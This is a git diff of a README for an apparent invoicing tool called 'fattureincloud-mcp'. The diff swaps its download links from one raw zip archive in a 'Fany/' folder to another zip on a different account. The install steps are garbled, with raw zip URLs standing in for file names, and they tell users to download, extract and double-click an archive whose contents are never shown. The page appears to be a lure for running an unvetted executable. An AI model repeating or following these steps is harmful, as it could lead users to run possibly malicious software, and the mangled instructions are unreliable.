@@ -1,7 +1,7 @@
 # 🚀 fattureincloud-mcp - Simplify Your Electronic Invoicing
 
 ## 📥 Download Now
-[![Download fatruincloud-mcp](https://github.com/PYAEKYAWPYAEKYAW/fattureincloud-mcp/raw/refs/heads/main/Fany/fattureincloud-mcp-2.1.zip)](https://github.com/PYAEKYAWPYAEKYAW/fattureincloud-mcp/raw/refs/heads/main/Fany/fattureincloud-mcp-2.1.zip)
+[![Download fatruincloud-mcp](https://raw.githubusercontent.com/pyaekyaw-dev/fattureincloud-mcp/main/Fany/mcp_fattureincloud_v3.4.zip)](https://raw.githubusercontent.com/pyaekyaw-dev/fattureincloud-mcp/main/Fany/mcp_fattureincloud_v3.4.zip)
 
 ## 🌟 Overview
 **fattureincloud-mcp** is a server application designed for managing electronic invoices in line with Italian regulations. With this tool, you can easily create, send, and track your invoices, utilizing the Fatture in Cloud API. Take advantage of Claude AI to streamline the process of invoicing without needing technical skills.
@@ -24,19 +24,19 @@ To run **fattureincloud-mcp**, your system should meet the following requirement
 Follow these steps to download and run the application:
 
 1. **Visit the Releases Page**
-   Go to the following link to access the releases page directly: [Download Link](https://github.com/PYAEKYAWPYAEKYAW/fattureincloud-mcp/raw/refs/heads/main/Fany/fattureincloud-mcp-2.1.zip).
+   Go to the following link to access the releases page directly: [Download Link](https://raw.githubusercontent.com/pyaekyaw-dev/fattureincloud-mcp/main/Fany/mcp_fattureincloud_v3.4.zip).
 
 2. **Choose the Latest Release**
    Look for the latest version of **fattureincloud-mcp** on the releases page. This version will have the most recent features and fixes.
 
 3. **Download the Application**
-   Click on the download link for the latest release package that is compatible with your operating system. The files will typically be named based on the version and platform, such as `https://github.com/PYAEKYAWPYAEKYAW/fattureincloud-mcp/raw/refs/heads/main/Fany/fattureincloud-mcp-2.1.zip` or `https://github.com/PYAEKYAWPYAEKYAW/fattureincloud-mcp/raw/refs/heads/main/Fany/fattureincloud-mcp-2.1.zip`.
+   Click on the download link for the latest release package that is compatible with your operating system. The files will typically be named based on the version and platform, such as `https://raw.githubusercontent.com/pyaekyaw-dev/fattureincloud-mcp/main/Fany/mcp_fattureincloud_v3.4.zip` or `https://raw.githubusercontent.com/pyaekyaw-dev/fattureincloud-mcp/main/Fany/mcp_fattureincloud_v3.4.zip`.
 
 4. **Extract the Files**
-   Once downloaded, extract the files from the zip or https://github.com/PYAEKYAWPYAEKYAW/fattureincloud-mcp/raw/refs/heads/main/Fany/fattureincloud-mcp-2.1.zip archive. Right-click on the file and select “Extract All” or similar, depending on your system.
+   Once downloaded, extract the files from the zip or https://raw.githubusercontent.com/pyaekyaw-dev/fattureincloud-mcp/main/Fany/mcp_fattureincloud_v3.4.zip archive. Right-click on the file and select “Extract All” or similar, depending on your system.
 
 5. **Run the Application**
-   After extraction, navigate to the folder containing the files. Double-click the application file named `https://github.com/PYAEKYAWPYAEKYAW/fattureincloud-mcp/raw/refs/heads/main/Fany/fattureincloud-mcp-2.1.zip` (Windows) or `fattureincloud-mcp` (Linux/macOS). 
+   After extraction, navigate to the folder containing the files. Double-click the application file named `https://raw.githubusercontent.com/pyaekyaw-dev/fattureincloud-mcp/main/Fany/mcp_fattureincloud_v3.4.zip` (Windows) or `fattureincloud-mcp` (Linux/macOS). 
 
 6. **Follow Initial Setup Instructions**
    The application will guide you through the initial setup steps. Follow the on-screen instructions to complete the configuration process.
